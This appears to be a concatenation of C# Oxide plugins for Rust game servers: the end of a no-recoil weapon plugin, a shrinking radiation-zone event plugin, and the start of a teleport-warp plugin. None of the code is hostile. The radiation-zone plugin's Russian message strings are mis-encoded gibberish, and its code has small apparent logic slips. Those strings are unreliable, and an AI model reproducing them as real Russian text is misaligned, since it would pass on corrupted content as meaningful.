				["NoRecoil_NoPermission"] = "У вас нет прав на использование этой команды.",
				["NoRecoil_WrongSyntaxConsole"] = "Неправильный синтаксис, используйте: nrg Steam64ID/Nick ShortName",
				["NoRecoil_WrongSyntaxChat"] = "Неправильный синтаксис, используйте: /nrg ShortName",
				["NoRecoil_PlayerNotFound"] = "Такого игрока нет!",
				["NoRecoil_ErrorNameGun"] = "{0} не существует в конфигурации",
				["NoRecoil_GunGiveSucc"] = "Оружие успешно выдано игроку!",
				["NoRecoil_UserNotPerm"] = "У этого игрока нет разрешения играть с этим оружием. Сначала ему нужно выдать разрешения - {0}",
				["NoRecoil_OffModification"] = "Вы отключили модификацию для всего {0}",
				["NoRecoil_EnableModification"] = "Оружие успешно модифицировано",
				["NoRecoil_NoModificationPermission"] = "У вас нет разрешения на изменение этого оружия.",
				["NoRecoil_NotAllowed"] = "Это оружие не входит в список разрешенных",
				["NoRecoil_Mustbeactive"] = "Оружие должно быть в руках",
			}, this, "ru");
		}

		public static StringBuilder sb = new StringBuilder();
		public String GetLang(String LangKey, String userID = null, params object[] args)
		{
			sb.Clear();
			if (args != null)
			{
				sb.AppendFormat(lang.GetMessage(LangKey, this, userID), args);
				return sb.ToString();
			}
			return lang.GetMessage(LangKey, this, userID);
		}
		#endregion

		#region Hooks

		void CheckValidator(BasePlayer player)
		{
			if (!Users.ContainsKey(player.userID))
			{
				Dictionary<string, bool> weaponList = new Dictionary<string, bool>();
				foreach (var item in config.recoilWeapon.settingsRecoil)
					weaponList.Add(item.Key, true);
				Users.Add(player.userID, weaponList);
			}

			var WeaponList = config.recoilWeapon.settingsRecoil;

			foreach (var weapon in WeaponList.Where(gun => !Users[player.userID].ContainsKey(gun.Key)))
				Users[player.userID].Add(weapon.Key, true);

		}
		private void OnPlayerConnected(BasePlayer player) => CheckValidator(player);

		void Unload()
		{
			ModifiItemAll(true);
			Interface.Oxide.DataFileSystem.WriteObject("NoRecoilUserData", Users);
		}

		private void OnServerInitialized()
		{
			foreach (BasePlayer player in BasePlayer.activePlayerList)
				OnPlayerConnected(player);
			ModifiItemAll(false);
		}
		private void Init()
		{
			Users = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<UInt64, Dictionary<String, Boolean>>>("NoRecoilUserData");
			permission.RegisterPermission(PermissionAdmin, this);
			foreach (var permReg in config.recoilWeapon.settingsRecoil)
				permission.RegisterPermission("NoRecoil." + permReg.Key, this);
		}

        private void OnItemAddedToContainer(ItemContainer container, Item item)
        {
			if (container?.entityOwner is AutoTurret && item?.GetHeldEntity() is BaseProjectile)
			{
				ModifiItemDefault(item);
				return;
			}
            if (container?.playerOwner == null)
                return;
            CheckAndModifyItem(item, container.playerOwner);
        }

		private void OnItemCraftFinished(ItemCraftTask task, Item item)
		{
			if (!(item.GetHeldEntity() is BaseProjectile))
				return;
			CheckAndModifyItem(item, task.owner);
		}
		object OnReloadWeapon(BasePlayer player, BaseProjectile projectile)
		{
			if (player == null || player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
				return null;
			CheckAndModifyItem(projectile.GetItem(), player);
			return null;		
		}
		object OnReloadMagazine(BasePlayer player, BaseProjectile projectile, int desiredAmount)
		{
			if (player == null || player.GetComponent<NPCPlayer>() != null || player.GetComponent<BaseNpc>() != null || player.IsNpc)
				return null;

			Int32 maxAmmoWeapon = 0;
			String weapon = player.GetActiveItem().info.shortname;

			if (config.recoilWeapon.settingsRecoil.ContainsKey(weapon) && player.GetActiveItem().HasFlag(global::Item.Flag.Placeholder))
				maxAmmoWeapon = config.recoilWeapon.settingsRecoil[weapon].maxAmmo;
			else
				return null;

			if (projectile.primaryMagazine.contents >= maxAmmoWeapon)
				return false;

			List<global::Item> list = player.inventory.FindItemIDs(projectile.primaryMagazine.ammoType.itemid).ToList<global::Item>();
			if (list.Count == 0)
			{
				List<global::Item> list2 = new List<global::Item>();
				player.inventory.FindAmmo(list2, projectile.primaryMagazine.definition.ammoTypes);
				if (list2.Count == 0)
				{
					return false;
				}
				list = player.inventory.FindItemIDs(list2[0].info.itemid).ToList<global::Item>();
				if (list == null || list.Count == 0)
				{
					return false;
				}
				if (projectile.primaryMagazine.contents > 0)
				{

					player.GiveItem(ItemManager.CreateByItemID(projectile.primaryMagazine.ammoType.itemid, projectile.primaryMagazine.contents, 0UL),BaseEntity.GiveItemReason.Generic);

					projectile.primaryMagazine.contents = 0;
				}
				projectile.primaryMagazine.ammoType = list[0].info;
			}
			int num = desiredAmount;
			if (num == -1)
			{
				num = maxAmmoWeapon - projectile.primaryMagazine.contents;
			}
			foreach (global::Item item in list)
			{
				int amount = item.amount;
				int num2 = Mathf.Min(num, item.amount);
				item.UseItem(num2);
				projectile.primaryMagazine.contents += num2;
				num -= num2;
				if (num <= 0)
				{
					break;
				}
			}
			projectile.SendNetworkUpdateImmediate(false);
			return false;
		}
        #endregion

        #region Commands
        [ConsoleCommand("nrg")]
		void GiveNoRecoilWeapon(ConsoleSystem.Arg arg)
		{
			if (arg == null || arg.Args == null || arg.Args.Length != 2 || arg.Args.Length > 2)
			{
				PrintWarning(GetLang("NoRecoil_WrongSyntaxConsole"));
				return;
			}
			BasePlayer player = BasePlayer.Find(arg.Args[0]);
			String WeaponShortname = arg.Args[1];

			if (player == null)
			{
				PrintWarning(GetLang("NoRecoil_PlayerNotFound"));
				return;
			}			
			if (!config.recoilWeapon.settingsRecoil.ContainsKey(WeaponShortname))
			{
				PrintWarning(GetLang("NoRecoil_ErrorNameGun", null, WeaponShortname));
				return;
			}
			if (permission.UserHasPermission(player.UserIDString, "NoRecoil." + WeaponShortname))
			{
				PrintWarning(GetLang("NoRecoil_UserNotPerm", null, "NoRecoil." + WeaponShortname));
				return;
			}
			CreateNoRecoilWeapon(player, WeaponShortname);
			PrintWarning(GetLang("NoRecoil_GunGiveSucc"));
		}

		[ChatCommand("nrg")]
		void GiveNoRecoilWeaponCmd(BasePlayer player, string cmd, string[] arg)
		{
			if (arg == null || arg.Length != 1 || arg.Length > 1)
			{
				SendChat(GetLang("NoRecoil_WrongSyntaxChat", player.UserIDString), player);
				return;
			}
			if (!permission.UserHasPermission(player.UserIDString, PermissionAdmin))
			{
				SendChat(GetLang("NoRecoil_NoPermission", player.UserIDString), player);
				return;
			}

			String WeaponShortname = arg[0];
			if (!config.recoilWeapon.settingsRecoil.ContainsKey(WeaponShortname))
			{
				SendChat(GetLang("NoRecoil_ErrorNameGun", player.UserIDString, WeaponShortname), player);
				return;
			}
			CreateNoRecoilWeapon(player, WeaponShortname);
			SendChat(GetLang("NoRecoil_GunGiveSucc", player.UserIDString), player);
		}

		[ChatCommand("nr")]
		void NoRecoilWeaponCmd(BasePlayer player)
		{
			Item recoilWeapon = player.GetActiveItem();
			if (recoilWeapon != null)
			{
				var weapon = recoilWeapon?.GetHeldEntity()?.GetComponent<BaseProjectile>();
				if (weapon != null && config.recoilWeapon.settingsRecoil.ContainsKey(recoilWeapon.info.shortname))
				{
					if (permission.UserHasPermission(player.UserIDString, "NoRecoil." + recoilWeapon.info.shortname) || permission.UserHasPermission(player.UserIDString, PermissionAdmin))
					{						
						if (recoilWeapon.HasFlag(global::Item.Flag.Placeholder))
						{
							ModifiItemDefault(recoilWeapon);
							SendChat(GetLang("NoRecoil_OffModification", player.UserIDString, recoilWeapon.info.displayName.english), player);
							Users[player.userID][recoilWeapon.info.shortname] = false;
						}
						else
						{
							ModifiItem(recoilWeapon);
							SendChat(GetLang("NoRecoil_EnableModification", player.UserIDString), player);
							Users[player.userID][recoilWeapon.info.shortname] = true;
						}
					}
					else
					{
						SendChat(GetLang("NoRecoil_NoModificationPermission", player.UserIDString), player);
						return;
					}
				}
				else
				{
					SendChat(GetLang("NoRecoil_NotAllowed", player.UserIDString), player);
					return;
				}
			}
			else
			{
				SendChat(GetLang("NoRecoil_Mustbeactive", player.UserIDString), player);
				return;
			}
		}
		#endregion

		#region Metods
		public void SendChat(string Message, BasePlayer player)
		{
			PrintToChat(player, Message);
		}

		void CreateNoRecoilWeapon(BasePlayer player, String name)
		{
			Item item = ItemManager.CreateByName(name);
			ModifiItem(item);
			player.GiveItem(item);
		}
		private void ModifiItemAll(Boolean unload)
		{
			BaseProjectile[] attachments = (BaseProjectile[])GameObject.FindObjectsOfType(typeof(BaseProjectile));
			if (attachments != null)
				foreach (BaseProjectile attachment in attachments)
					CheckAndModifyItem(attachment?.GetItem(), attachment?.GetItem()?.GetOwnerPlayer(), unload);
		}

		private void ModifiItem(Item item)
		{
			item.SetFlag(global::Item.Flag.Placeholder, true);
			BaseProjectile projectile = item.GetHeldEntity() as BaseProjectile;
			var cfg = config.recoilWeapon.settingsRecoil[item.info.shortname];
			projectile.primaryMagazine.capacity = cfg.recoilDeform == 100 ? int.MaxValue : projectile.primaryMagazine.definition.builtInSize * cfg.recoilDeform;
			if (config.recoilWeapon.addPrefixGun)
				item.name = item.info.displayName.english + " " + config.recoilWeapon.prefixGun;
			if (cfg.skinId != 0UL)
				item.skin = cfg.skinId;
			projectile.SendNetworkUpdate();
			item.MarkDirty();
		}

		private void ModifiItemDefault(Item item)
		{
			item.SetFlag(global::Item.Flag.Placeholder, false);
			BaseProjectile projectile = item.GetHeldEntity() as BaseProjectile;
			projectile.primaryMagazine.capacity = projectile.primaryMagazine.definition.builtInSize;
			if (config.recoilWeapon.addPrefixGun)
				item.name = item.info.displayName.english;
			if (config.recoilWeapon.settingsRecoil[item.info.shortname].skinId != 0UL)
				item.skin = 0UL;
			projectile.SendNetworkUpdate();
			item.MarkDirty();
		}

		private void CheckAndModifyItem(Item item, BasePlayer player, Boolean unload = false)
		{
			var weapon = item?.GetHeldEntity()?.GetComponent<BaseProjectile>();
			if (weapon == null)
				return;
			if (!config.recoilWeapon.settingsRecoil.ContainsKey(item.info.shortname))
				return;
			if (!unload)
			{
				if (player == null || player.IsNpc)
					return;
				if (Users.ContainsKey(player.userID))
					if (Users[player.userID][item.info.shortname])
					{
						if (permission.UserHasPermission(player.UserIDString, "NoRecoil." + item.info.shortname) || permission.UserHasPermission(player.UserIDString, PermissionAdmin))
							ModifiItem(item);
						else
							ModifiItemDefault(item);
					}
			}
			else
				ModifiItemDefault(item);

		}
		#endregion
	}
}

// --- End of file: NoRecoil.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/RadShrinkZone.cs ---
// --- Original Local Path: RadShrinkZone.cs ---

using System;
using System.Collections.Generic;
using UnityEngine;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;

using System.Text.RegularExpressions;
namespace Oxide.Plugins
{
    [Info("RadShrinkZone", "vaalberith", "1.0.4", ResourceId = 1828)]
	class RadShrinkZone : RustPlugin
    {
		
		//DEFAULT VALUES
		
		Vector3 target = new Vector3(0,0,0);
		float saferadius = 10;
		float saferadiusmin = 5;
		float eventradius = 40;
		float radpower = 50;
		float step = 1;
		float period = 20;
		//float drawtime = 5;
		//string drawmode = "both";
		
		string permissionrad="RadShrinkZone.can";
		bool breaking = true;
		bool ok = true;
		
		//INITIALISATION\DECLARATION
		List<Vector3> position = new List<Vector3>();
		readonly DynamicConfigFile dataFile = Interface.Oxide.DataFileSystem.GetFile("RadShrinkZoneDefault");
		Dictionary<string, List<string>> radzonedata = new Dictionary<string, List<string>>();
		
		//LOCALIZATION
		
		#region Localization
		 
		string GetMessage(string key, string steamId = null) => lang.GetMessage(key, this, steamId);
		
        void LoadDefaultMessages()
        {
            var messagesEn = new Dictionary<string, string> 
            {
                {"EventStart", "Radiation is coming! Run to the centre to safe your life! ( {0} : {1} )"},
                {"RadiusDecreased", "Radius of safezone decreased!"},
                {"SafezoneRadiusReachedMin", "Radius of safezone reached its minimum!"},
                {"EventStopped", "Event stopped!"},
                {"NoPerm", "No permission!"},
				{"Help", "Type /rad for usage help"},
				{"Helplong", "<color=red>Config:</color>\n/rad saferad (m)\n /rad saferadmin (m)\n/rad eventrad (m)\n/rad radpower (%)\n/rad step (num)\n/rad period (seconds)\n/rad x y z\n/rad me (uses your position as target)\n<color=red>Manager:</color>\n/rad start\n/rad stop (stops decrease)\n/rad clear (close event and remove zones)"},
				{"Erased", "Erased all event rad zones"}
            };
            lang.RegisterMessages(messagesEn, this);
			 
			var messagesRu = new Dictionary<string, string>
            {
				{"EventStart", "Ð Ð°Ð´Ð¸Ð°ÑÐ¸Ñ Ð¿Ð¾ÑÐ²Ð»ÑÐµÑÑÑ! ÐÐµÐ³Ð¸ Ð² ÑÐµÐ½ÑÑ, ÑÑÐ¾Ð±Ñ Ð²ÑÐ¶Ð¸ÑÑ! ( {0} : {1} )"},
				{"RadiusDecreased", "Ð Ð°Ð´Ð¸ÑÑ Ð±ÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð¾Ð¹ Ð·Ð¾Ð½Ñ ÑÐ¼ÐµÐ½ÑÑÐ¸Ð»ÑÑ!"},
				{"SafezoneRadiusReachedMin", "Ð Ð°Ð´Ð¸ÑÑ Ð±ÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð¾Ð¹ Ð·Ð¾Ð½Ñ Ð´Ð¾ÑÑÐ¸Ð³ Ð¼Ð¸Ð½Ð¸Ð¼ÑÐ¼Ð°!"},
				{"EventStopped", "ÐÐ²ÐµÐ½Ñ Ð·Ð°ÐºÐ¾Ð½ÑÐ¸Ð»ÑÑ!"},
				{"NoPerm", "ÐÐµÑ Ð¿ÑÐ°Ð²!"},
				{"Help", "ÐÐ°Ð¿Ð¸ÑÐ¸ /rad Ð´Ð»Ñ Ð¿Ð¾Ð´ÑÐºÐ°Ð·ÐºÐ¸"},
				{"Helplong", "<color=red>Config:</color>\n/rad saferad (m)\n /rad saferadmin (m)\n/rad eventrad (m)\n/rad radpower (%)\n/rad step (num)\n/rad period (seconds)\n/rad x y z\n/rad me (uses your position as target)\n<color=red>Manager:</color>\n/rad start\n/rad stop (stops decrease)\n/rad clear (close event and remove zones)"},
				{"Erased", "ÐÑÐµ Ð¸Ð²ÐµÐ½Ñ-Ð·Ð¾Ð½Ñ Ð¾ÑÐ¸ÑÐµÐ½Ñ"}
			};
            lang.RegisterMessages(messagesRu, this, "ru");
        } 
        #endregion
		
		//CONFIG
		
		//PLUGIN REFERENCE AND HOOKS
		
		[PluginReference]
        Plugin ZoneManager;
		
		void OnServerInitialized()
        {
			LoadDefaultMessages();
            if (plugins.Exists("ZoneManager")) ok = true;
            else 
			{
				PrintWarning("Install ZoneManager!");
				ok=false;
			}
			
			radzonedata = dataFile.ReadObject<Dictionary<string, List<string>>>();
			List<string> pos;
			if (!radzonedata.TryGetValue("Position", out pos))
			{
				//first datafile creating ("position" does not exist)
				safecfg();
				Puts("BattleRoyale RadZone created for first time.");
			}
			else Puts("BattleRoyale RadZone datafile loaded.");
			execcfg();
        }
		
		void execcfg()
		{
			radzonedata = dataFile.ReadObject<Dictionary<string, List<string>>>();
			List<string> value;
			if (radzonedata.TryGetValue("Position", out value))
				target.x=Convert.ToSingle(value[0]);target.y=Convert.ToSingle(value[1]);target.z=Convert.ToSingle(value[2]);
			if (radzonedata.TryGetValue("SafeRadius", out value))
				saferadius=Convert.ToSingle(value[0]);
			if (radzonedata.TryGetValue("SafeRadiusMinimum", out value))
				saferadiusmin=Convert.ToSingle(value[0]);
			if (radzonedata.TryGetValue("EventRadius", out value))
				eventradius=Convert.ToSingle(value[0]);
			if (radzonedata.TryGetValue("RadiationPower", out value))
				radpower=Convert.ToSingle(value[0]);
			if (radzonedata.TryGetValue("DecreaseStep", out value))
				step=Convert.ToSingle(value[0]);
			if (radzonedata.TryGetValue("DecreasePeriod", out value))
				period=Convert.ToSingle(value[0]);
			/*if (radzonedata.TryGetValue("DrawTime", out value))
				drawtime=Convert.ToSingle(value[0]);
			if (radzonedata.TryGetValue("DrawMode", out value))
				drawmode=value[0];*/
		}
		
		void safecfg()
		{
			radzonedata["Position"] = new List<string>(){target.x.ToString(),target.y.ToString(),target.z.ToString()};
			radzonedata["SafeRadius"] = new List<string>(){saferadius.ToString()};
			radzonedata["SafeRadiusMinimum"] = new List<string>(){saferadiusmin.ToString()};
			radzonedata["EventRadius"] = new List<string>(){eventradius.ToString()};
			radzonedata["RadiationPower"] = new List<string>(){radpower.ToString()};
			radzonedata["DecreaseStep"] = new List<string>(){step.ToString()};
			radzonedata["DecreasePeriod"] = new List<string>(){period.ToString()};
			/*radzonedata["DrawTime"] = new List<string>(){drawtime.ToString()};
			radzonedata["DrawMode"] = new List<string>(){drawmode};*/
			
			dataFile.WriteObject(radzonedata);
		}
		
		void Unload() 
		{
			DestroyAllSpheres();
			DelPos();
		}
		
		void Loaded()
		{
			permission.RegisterPermission(permissionrad, this);
		}
		
		/*void OnEnterZone(string ZoneID, BasePlayer player)
		{
			if (breaking) return;
			if (!ZoneID.Contains("radshrink_pos_")) return;
			if (drawmode=="rad" || drawmode=="both")
			{
				Regex regex = new Regex(@"\d+");
				Match match = regex.Match(ZoneID);
				if (match.Success)
				{
					float sphereradius = (eventradius-saferadius)/2;
					player.SendConsoleCommand("ddraw.sphere", drawtime, Color.red, position[Convert.ToInt32(match.Value, 16)], sphereradius);
				}
			}
			if (drawmode=="safe"|| drawmode=="both") player.SendConsoleCommand("ddraw.sphere", drawtime, Color.green, target, saferadius);
		}*/
		
		
		//MAIN FUNCTIONS
		private List<BaseEntity> Spheres = new List<BaseEntity>();
		private const string SphereEnt = "assets/prefabs/visualization/sphere.prefab";
		
		private void CreateSphere(Vector3 position, float radius)
        {
            BaseEntity sphere = GameManager.server.CreateEntity(SphereEnt, position, new Quaternion(), true);
            SphereEntity ent = sphere.GetComponent<SphereEntity>();
            ent.currentRadius = radius * 2;
            ent.lerpSpeed = 0f;
            sphere?.Spawn(true);
            Spheres.Add(sphere);
        }
        
        private void DestroyAllSpheres()
        {
            foreach (var sphere in Spheres)
                if (sphere != null)
                    sphere.KillMessage();
        }
		
		private void createZone(string zoneID, Vector3 pos, float radius, float rads)
        {
            List<string> build = new List<string>();
            build.Add("radius");
            build.Add(radius.ToString());
            build.Add("radiation");
            build.Add(rads.ToString());
            string[] zoneArgs = build.ToArray();
            ZoneManager?.Call("CreateOrUpdateZone", zoneID, zoneArgs, pos);
        }  
		
        private void eraseZone(string zoneID)
        {
            ZoneManager.Call("EraseZone", zoneID);
        }

		private void CalcPos (Vector3 pos)
		{
			if (breaking) return;
			position.Clear();
			float centerline = (eventradius+saferadius)/2;
			float sphereradius = (eventradius-saferadius)/2;
			float corn = centerline *0.71f; 
			Vector3 SW = new Vector3(pos.x-corn, pos.y, pos.z-corn); position.Add(SW);
			Vector3 W = new Vector3(pos.x-centerline, pos.y, pos.z); position.Add(W);
			Vector3 NW = new Vector3(pos.x-corn, pos.y, pos.z+corn); position.Add(NW);
			Vector3 N = new Vector3(pos.x, pos.y, pos.z+centerline); position.Add(N);
			Vector3 NE = new Vector3(pos.x+corn, pos.y, pos.z+corn); position.Add(NE);
			Vector3 E = new Vector3(pos.x+centerline, pos.y, pos.z); position.Add(E);
			Vector3 SE = new Vector3(pos.x+corn, pos.y, pos.z-corn); position.Add(SE);
			Vector3 S = new Vector3(pos.x, pos.y, pos.z-centerline); position.Add(S);
			int i=0;
			foreach(Vector3 elem in position)
			{
				createZone("radshrink_pos_"+i,elem,sphereradius,radpower);
				i++;
			}
		}
		
		private void DelPos()
		{
			stop();
			int i=0;
			foreach(Vector3 elem in position)
			{
				eraseZone("radshrink_pos_"+i);
				i++;
			}
			position.Clear();
			if (i>0) Puts(GetMessage("Erased"));
		}
		 
		private void started()
		{
			ConVar.Server.radiation = true;
			breaking = false;
			execcfg();
			PrintToChat(GetMessage("EventStart"),target.x,target.z);
			Puts (GetMessage("EventStart"),target.x,target.z);
			StartZoneShrink();
		}
		
		private void stop()
		{
			breaking=true;
			PrintToChat(GetMessage("EventStopped"));
			Puts(GetMessage("EventStopped"));
			ConVar.Server.radiation = true;
		}
		
		private void StartZoneShrink()
        {
			DestroyAllSpheres();
			if (breaking) return;
			CreateSphere(target, saferadius);
            timer.In(period, () => Shrink());
        }
		
		private void Shrink()
		{
			if (breaking) return;
			if (saferadius <= saferadiusmin) 
			{
				PrintToChat(GetMessage("SafezoneRadiusReachedMin"));
				Puts(GetMessage("SafezoneRadiusReachedMin"));
				return;
			}
			CalcPos(target);
			saferadius=saferadius - step;
			Puts(GetMessage("RadiusDecreased"));
			PrintToChat(GetMessage("RadiusDecreased"));
			StartZoneShrink();
		}
		
		bool IsAllowed(BasePlayer player, string perm)
        {
            if (permission.UserHasPermission(player.userID.ToString(), perm)) return true;
            return false;
        }
		
		// INTERFACE, COMMANDS
		
		[ChatCommand("rad")]
        void radchat(BasePlayer player, string cmd, string[] args)
        {
			if (!ok) return;
			if (player !=null)
			{
				if (!IsAllowed(player, permissionrad))
				{	
					SendReply(player, GetMessage("NoPerm", player.UserIDString));
					return;
				}
			} 
			
			if (args.Length == 1)
			{
				if (args[0]=="start") 
				{
					started();
				}
				else if (args[0]=="stop")
				{
					stop();
				}
				else if (args[0]=="clear")
				{
					DelPos();
				}
				else if (args[0]=="me")
				{
					if (player == null) return;
					target=player.transform.position;
					safecfg();
				}
				
				else if (player !=null) SendReply(player, GetMessage("Help", player.UserIDString));
				
				return;
			}
			
			if (args.Length == 2)
			{
				/*if (args[0]=="drawmod")
				{
					if (args[1] == "safe" || args[1] == "rad" || args[1] == "both" || args[1] == "none")
					{
						drawmode=args[1];
					}
					else  if (player !=null) SendReply(player, GetMessage("Help", player.UserIDString));
				}
				else if (args[0]=="drawtime")
				{
					drawtime=Convert.ToSingle(args[1]);
				}
				
				else*/ if (args[0]=="saferad")
				{				
					saferadius = Convert.ToSingle(args[1]);
				}
				
				else if (args[0]=="saferadmin")
				{				
					saferadiusmin = Convert.ToSingle(args[1]);
				}
				
				else if (args[0]=="eventrad")
				{				
					eventradius = Convert.ToSingle(args[1]);
				}
				
				else if (args[0]=="radpower")
				{				
					radpower = Convert.ToSingle(args[1]);
				}
				
				else if (args[0]=="step")
				{				
					step = Convert.ToSingle(args[1]);
				}
				
				else if (args[0]=="period")
				{				
					period = Convert.ToSingle(args[1]);
				}
				
				else if (player !=null) SendReply(player, GetMessage("Help", player.UserIDString));
				
				safecfg();
				return;
			}
			
			if (args.Length == 3)
			{
				target.x = Convert.ToSingle(args[0]);
				target.y = Convert.ToSingle(args[1]);
				target.z = Convert.ToSingle(args[2]);
				safecfg();
			}
			
			else if (player !=null) SendReply(player, GetMessage("Helplong", player.UserIDString));
			return;
		}
		
		[ConsoleCommand("rad")] 
		void radconsole(ConsoleSystem.Arg arg) 
		{
			if (arg.Args == null) return;
			string [] args = arg.Args;
			
			if (arg.connection != null)
            {
                BasePlayer player = arg.connection.player as BasePlayer;
				if (!IsAllowed(player, permissionrad))
				{	
					PrintToChat(player, GetMessage("NoPerm", player.UserIDString));
					return;
				}
				radchat(player, "rad", args);
			}
			
			radchat(null, "rad", args);
			return;
		}
	}
}

// --- End of file: RadShrinkZone.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Warps.cs ---
// --- Original Local Path: Warps.cs ---


/*
 ########### README ####################################################
 #                                                                     #
 #   1. If you found a bug, please report them to developer!           #
 #   2. Don't edit that file (edit files only in CONFIG/LANG/DATA)     #
 #                                                                     #
 ########### CONTACT INFORMATION #######################################
 #                                                                     #
 #   Website: https://rustworkshop.space/                              #
 #   Discord: Orange#0900                                              #
 #   Email: admin@rustworkshop.space                                   #
 #                                                                     #
 #######################################################################
*/

using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Libraries.Covalence;
using Rust;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Warps", "Orange", "1.1.1")]
    [Description("https://rustworkshop.space/resources/warps.180/")]
    public class Warps : RustPlugin
    {
        #region Vars

        private static CollisionDetector[] AllWarps => UnityEngine.Object.FindObjectsOfType<CollisionDetector>();

        #endregion
        
        #region Oxide Hooks

        private void Init()
        {
            foreach (var obj in config.warps)
            {
                if (string.IsNullOrEmpty(obj.permission) == false && permission.PermissionExists(obj.permission) == false)
                {
                    permission.RegisterPermission(obj.permission, this);
                }
            }

            foreach (var command in config.commands)
            {
                cmd.AddChatCommand(command, this, nameof(cmdControlChat));
            }
        }

        private void OnServerInitialized()
        {
            DestroyWarps();
            timer.Once(1f, CreateWarps);
        }

        private void Unload()
        {
            DestroyWarps();
        }

        #endregion

        #region Commands

        private void cmdControlChat(BasePlayer player, string command, string[] args)
        {
            if (player.IsAdmin == false)
            {
                player.ChatMessage("No Permission");
                return;
            }
            
            var action = args?.Length > 0 ? args[0] : "null";
            var name = args?.Length > 1 ? args[1] : "null";
            var text = $"{player.displayName} [{player.userID}] ";

            switch (action.ToLower())
            {
                case "clear":
                    text += "removed all warps!";
                    DestroyWarps();
                    config.warps.Clear();
                    SaveConfig();
                    break;
                
                case "add":
                    var def = new WarpDefinition
                    {
                        shortname = name,
                        position = player.transform.position,
                        note = $"Created by {player.displayName} at {DateTime.UtcNow:dd/MM/yyyy}"
                    };
  
                    text += $"added warp ({def.shortname}) at {def.position}";
                    config.warps.Add(def);
                    SaveConfig();
                    CreateWarp(def);
                    player.ChatMessage($"Warp with name {def.shortname} was successfully created!");
                    break;
                
                case "remove":
                    var match = config.warps.Where(x => x.shortname.Contains(name, CompareOptions.OrdinalIgnoreCase)).ToArray();
                    text += "removed warp ";
                    var objs = AllWarps;
                    
                    foreach (var value in match)
                    {
                        text += $"({value.shortname}) ";
                        config.warps.Remove(value);
                        var obj = objs.FirstOrDefault(x => x.name == value.shortname);
                        UnityEngine.Object.Destroy(obj);
                    }
                    
                    SaveConfig();
                    player.ChatMessage($"{match.Length} warps was removed!");
                    break;
                
                default:
                    player.ChatMessage("Usage:\n/warp add/remove NAME - to add/remove warp with NAME\n/warps clear - remove all warps");
                    return;
            }
            
            PrintWarning(text);
            LogToFile("general", text, this);
        }

        #endregion

        #region Core

        private void CreateWarps()
        {
            foreach (var warp in config.warps)
            {
                CreateWarp(warp);
            }

            timer.Once(1f, () =>
            {
                Puts($"{config.warps.Count} warps was created! Total: {AllWarps.Length}");
            });
        }

        private void DestroyWarps()
        {
            foreach (var obj in AllWarps)
            {
                UnityEngine.Object.Destroy(obj);
            }
        }

        private void CreateWarp(WarpDefinition definition)
        {
            var obj = CollisionDetector.Create();
            obj.OnPlayerEnter = player => OnPlayerJoined(player, definition);
            obj.Radius = definition.radius;
            obj.name = definition.shortname;
            obj.transform.position = definition.position;
        }

        private void OnPlayerJoined(BasePlayer player, WarpDefinition warp)
        {
            if (player.IsSleeping() || player.IsReceivingSnapshot == true || player.IsDead())
            {
                Message.Send(player, Message.Key.PreventingWarp, "{name}", warp.displayName);
                return;
            }

            if (string.IsNullOrEmpty(warp.permission) == false &&  permission.UserHasPermission(player.UserIDString, warp.permission) == false)
            {
                Message.Send(player, Message.Key.Permission);
                return;
            }
            
            Message.Send(player, Message.Key.EnteringWarp, "{name}", warp.displayName);

            foreach (var command in warp.commandsToPlayer)
            {
                if (string.IsNullOrWhiteSpace(command) == false && command.StartsWith("example") == false)
                {
                    var str = GetReplacedString(command, player, warp);
                    player.SendConsoleCommand(str);
                }
            }
            
            foreach (var command in warp.commandsToServer)
            {
                if (string.IsNullOrWhiteSpace(command) == false && command.StartsWith("example") == false)
                {
                    var str = GetReplacedString(command, player, warp);
                    Server.Command(str);
                }
            }

            if (warp.positionToTeleport != new Vector3())
            {
                Teleport(player, warp.positionToTeleport);
            }
        }

        private static void Teleport(BasePlayer player, Vector3 position)
        {
            player.ConsoleMessage($"[Warps] Teleporting to {position}");
            player.RemoveFromTriggers();
            //player.EnableServerFall(false);
            player.EnsureDismounted();
            player.SetParent(null, true, true);
            player.StartSleeping(); 
            player.SetPlayerFlag(BasePlayer.PlayerFlags.ReceivingSnapshot, true);
            player.Teleport(position);
            player.UpdateNetworkGroup();
            player.SendEntityUpdate();
            player.SendNetworkUpdateImmediate();
            player.ClientRPCPlayer(null, player, "StartLoading");
            player.SendFullSnapshot();
            player.ForceUpdateTriggers();
        }

        private static string GetReplacedString(string original, BasePlayer player, WarpDefinition warp)
        {
            return original
                .Replace("{userid}", player.UserIDString, StringComparison.OrdinalIgnoreCase)
                .Replace("{steamid}", player.UserIDString, StringComparison.OrdinalIgnoreCase)
                .Replace("{warp}", warp.shortname, StringComparison.OrdinalIgnoreCase);
        }

        #endregion
        
        #region Classes

        private static ConfigDefinition config = new ConfigDefinition();

        private class ConfigDefinition
        {
            [JsonProperty("Commands")]
            public string[] commands = {"warp", "warps"};
            
            [JsonProperty("Warps")]
            public List<WarpDefinition> warps = new List<WarpDefinition>();
        }
        
        private class WarpDefinition
        {
            [JsonProperty("Shortname")]
            public string shortname = Core.Random.Range(0, 99999).ToString();

            [JsonProperty("Display Name")] 
            public string displayName = "Best Warp";
            
            [JsonProperty("Position")]
            public Vector3 position = new Vector3();

            [JsonProperty("Permission")]
            public string permission = "";

            [JsonProperty("Radius (meters)")]
            public float radius = 1.5f;

            [JsonProperty("Position to teleport")]
            public Vector3 positionToTeleport = new Vector3();
            
            [JsonProperty("Note")]
            public string note = "Description";

            [JsonProperty("Commands called to player")]
            public string[] commandsToPlayer =
            {
                "example.run {userID}",
                "example.run {userID}",
                "example.run {userID}",
            };

            [JsonProperty("Commands called to server")]
            public string[] commandsToServer =
            {
                "example.run {userID}",
                "example.run {userID}",
                "example.run {userID}",
            };
        }
        
        private partial class Message
        {
            private static Dictionary<Key, object> messages = new Dictionary<Key, object>
            {
                {Key.EnteringWarp, "You are entering warp <color=#ffff00>{name}</color>"},
